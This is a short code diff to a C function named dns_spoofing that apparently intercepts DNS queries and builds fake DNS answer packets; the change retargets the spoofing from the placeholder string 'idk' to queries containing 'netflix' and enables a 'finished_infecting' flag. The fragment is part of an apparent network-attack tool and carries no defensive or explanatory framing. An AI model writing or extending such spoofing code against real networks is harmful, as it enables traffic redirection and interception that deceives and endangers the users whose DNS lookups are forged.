@@ -216,7 +216,7 @@ static int dns_spoofing(
 	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
 	void* end_packet;
 	
-	if (!strstr(dns_question, "idk"))
+	if (!strstr(dns_question, "netflix"))
 		return 0;
 
 	/* create fake dns packet */
@@ -232,7 +232,7 @@ static int dns_spoofing(
 
 	/* update status */
 	*packet_size = (BYTE*)end_packet - (BYTE*)packet;
-	//finished_infecting = 1;
+	finished_infecting = 1;
 
 	return 1; // true if changed
 }
